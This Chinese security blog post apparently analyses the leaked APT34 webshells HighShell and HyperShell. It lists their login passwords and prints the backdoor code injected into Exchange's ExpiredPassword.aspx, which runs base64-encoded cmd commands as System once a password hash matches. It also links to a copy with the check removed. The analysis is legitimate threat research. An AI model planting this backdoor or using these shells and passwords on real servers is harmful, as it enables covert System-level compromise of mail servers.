##  0x00 前言

 **前段时间APT34的6款工具被泄露，本文仅在技术角度对其中的HighShell和HyperShell进行分析**

参考资料：

> <https://malware-research.org/apt34-hacking-tools-leak/amp/>

##  0x01 简介

本文将要介绍以下内容：

> 1.对HighShell的分析
>
> 2.对HyperShell的分析
>
> 3.小结

##  0x02 对HighShell的分析

对应泄露文件的名称为Webshells_and_Panel中的HighShell

其中的文件为HighShell.aspx，是针对Windows服务器的webshell

默认访问页面如下图![](https://image.3001.net/images/20190809/1565319217_5d4ce031aad4c.png!small)

Login框为红色，需要输入连接口令

正确的口令为 Th!sN0tF0rFAN

输入正确的口令后，点击Do it，刷新页面，成功登录，如下图

![](https://image.3001.net/images/20190809/1565319264_5d4ce060b5f8e.png!small)

Login框变为绿色

该工具的公开线索：

> <https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-> access-point-lateral-movement/>

HighShell同paloaltonetworks在文中提到的TwoFace的页面相同

##  0x03 对HyperShell的分析

对应泄露文件的名称为Webshells_and_Panel中的HyperShell

下面包含7个文件夹:

> 1.ExpiredPasswordTech
>
> 2.HyperShell
>
> 3.Image
>
> 4.Libraries
>
> 5.packages
>
> 6.ShellLocal
>
> 7.StableVersion

###  1.ExpiredPasswordTech

包括3个文件：

error4.aspx，功能与HighShell.aspx相同，但登录口令未知

ExpiredPassword.aspx，适用于Exchange的webshell

MyMaster.aspx，生成字符串： NxKK7a

###  2.HyperShell

包含多个文件，是各个webshell的源码文件

其中包含另一个可用的webshell，

> 相对路径： .\Webshells_and_Panel\HyperShell\HyperShell\Shell\simple.aspx

连接口令： MkRg5dm8MOk

如下图

![](https://image.3001.net/images/20190809/1565319363_5d4ce0c3abf9a.png!small)

###  3.Image

图片文件夹

###  4.Libraries

包含多个依赖文件

###  5.packages

包含多个依赖文件

###  6\. ShellLocal

空文件夹

###  7\. StableVersion

稳定版本，包含多个webshell：

 **(1)ExpiredPassword.aspx**

适用于Exchange的webshell

> 相对路径：.\Webshells_and_Panel\HyperShell\StableVersion\HighShell
> v5.0\HyperShell\HyperShell\ExpiredPasswordTech

与相对路径.\Webshells_and_Panel\HyperShell\ExpiredPasswordTech下的文件内容相同

ExpiredPassword.aspx是Exchange正常的功能，对应重置用户口令的页面，如下图

![](https://image.3001.net/images/20190809/1565319424_5d4ce100cfe32.png!small)

> 访问的URL：https://<domain>/owa/auth/ExpiredPassword.aspx

> 对应Windows绝对路径：C:\Program Files\Microsoft\Exchange
> Server\V15\FrontEnd\HttpProxy\owa\auth\ExpiredPassword.aspx

该路径下的webshell默认权限为System

我的测试系统安装了Exchange2013，正常的ExpiredPassword.aspx源码我已经上传至github：

>
> <https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx>(2013)  
>

HyperShell中的ExpiredPassword.aspx是一个添加了后门代码的文件，同我测试环境的正常ExpiredPassword.aspx文件相比有多处不同，如下图

![](https://image.3001.net/images/20190809/1565319441_5d4ce1112f92d.png!small)经过分析发现有可能是Exchange版本差异导致的，忽略版本差异，HyperShell中的ExpiredPassword.aspx主要添加了如下代码：

    
    
     <%
                        try{
                        if (Convert.ToBase64String(new System.Security.Cryptography.SHA1Managed().ComputeHash(Encoding.ASCII.GetBytes(Encoding.ASCII.GetString(Convert.FromBase64String(Request.Form["newPwd1"])) + "reDGEa@#!%FS"))) == "+S6Kos9D/etq1cd///fgTarVnUQ=")
                        {
                            System.Diagnostics.Process p = new System.Diagnostics.Process();
                            System.Diagnostics.ProcessStartInfo i = p.StartInfo;
                            i.FileName = "cmd";
                            i.Arguments = "/c " + Encoding.UTF8.GetString(Convert.FromBase64String(Request.Form["newPwd2"]));
                            i.UseShellExecute = false;
                            i.CreateNoWindow = true;
                            i.RedirectStandardOutput = true;
                            p.Start();
                            string r = p.StandardOutput.ReadToEnd();
                            p.WaitForExit();
                            p.Close();
                            Response.Write("<pre>" + Server.HtmlEncode(r) + "</pre>");
                            Response.End();
                        }}catch{}
                    %>

对应到我的测试环境，也就是Exchange2013，添加payload后并去掉验证环节的代码已上传至github：

>
> <https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx>(2013)(HyperShell)

Confirm new password项为传入要执行的命令，权限为System

**(2)HighShellLocal**

功能强大的webshell

相对路径：.\Webshells_and_Panel\Webshells_and_Panel\HyperShell\StableVersion\HighShell
v5.0\HyperShell\HyperShell\ShellLocal\StableVersions\ShellLocal-v8.8.5.rar

解压到当前目录，相对路径为.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\HighShellLocal，包括以下文件：

> 文件夹css
>
> 文件夹files
>
> 文件夹js
>
> HighShellLocal.aspx

实际使用时，还需要.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\下的bin文件夹，否则提示无法使用Json

完整结构如下：

    
    
    │   HighShellLocal.aspx
    │
    ├───bin
    │       Newtonsoft.Json.dll
    │
    ├───css
    │   │   main.css
    │   │
    │   └───img
    │           box-zipper.png
    │           download-cloud.png
    │           exclamation-diamond.png
    │           heart-break.png
    │           heart-empty.png
    │           heart.png
    │           minus-button.png
    │
    ├───files
    │       7za.exe
    │       nbt.exe
    │       rx.exe
    │
    └───js
        │   explorer.js
        │   main.js
        │   send.js
        │   utility.js
        │
        ├───components
        │      
        ├───jquery
        │       
        └───semantic

登录口令： Th!sN0tF0rFAN

登录页面如下图

![](https://image.3001.net/images/20190809/1565319573_5d4ce195678ff.png!small)

输入正确的登录口令后，如下图

![](https://image.3001.net/images/20190809/1565319585_5d4ce1a177c07.png!small)

可以看到该webshell支持多个功能。

##  0x04 小结

本文对泄露文件中的HighShell和HyperShell进行了分析，其中HyperShell中的ExpiredPassword.aspx是一个比较隐蔽的webshell，目前为止网络上还未在公开资料中找到这种利用方法。

 ***本文原创作者： 辛木容是天才，转载请注明来自FreeBuf.COM**

